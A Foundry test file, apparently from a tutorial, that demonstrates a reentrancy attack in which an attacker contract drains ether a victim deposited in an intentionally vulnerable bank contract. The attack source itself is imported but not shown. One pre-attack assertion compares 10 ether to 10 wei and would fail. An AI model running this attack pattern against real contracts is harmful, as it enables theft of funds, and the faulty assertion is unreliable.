// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";  // Importing Foundry tools
import "../src/Attacker.sol";
import "../src/Bank.sol";


// The contract will be a Test, and we will get access to vm Foundry methods
contract ReentrancyTest is Test {
    
    address public owner;
    address public alice;
    
    VBank public bank; // State variables for contracts
    Attacker public attacker;

    // This function in Foundry is called setup() and runs automatically during testing
    function setUp() public {
        // Alice is a victim who will keep money in a vulnerable bank
        alice = makeAddr("alice"); // Assign the address for the variable alice formed by byte hashing the word "alice"
        vm.deal(alice, 10 ether); // Give the address alice 10 ETH

        owner = makeAddr("owner"); //Create an address for the hacker
        vm.deal(owner, 10 ether); 

        vm.startPrank(owner); // Now all actions will be performed from the owner's address

        bank = new VBank(); // Deploy a vulnerable bank's smart contract
        attacker = new Attacker(address(bank)); // Deploy the attack contract and link it to the bank's address
        vm.stopPrank(); // Stop acting from the owner's address — written purely for readability if placed at the end of the function body
    }
        
        // Function for testing the attack — the name must begin with test
        function testReentrancy() public {
        
        vm.startPrank(alice); 
        bank.deposit{value: 10 ether}(); // The victim deposits ether into the bank contract
        vm.stopPrank();

        vm.startPrank(owner);

        assertEq(address(owner).balance, 10); // Checking the hacker's balance before the attack, just for clarity
        assertEq(address(bank).balance, 10 ether); //Checking the bank's balance after victim's deposit

        attacker.attack{value: 1 ether}(); // Launch the attack. The receive function with a repeated withdraw will be called itself
        attacker.withdrawAll(); // Hacker withdraws money to his own address
        assertGt(address(owner).balance, 10 ether); // Check that the hacker's balance became greater than before

        vm.stopPrank();
    }

    receive() external payable {} // This is just in case, for debugging: if the money goes somewhere unexpected, the test contract will be able to receive it.

    

}


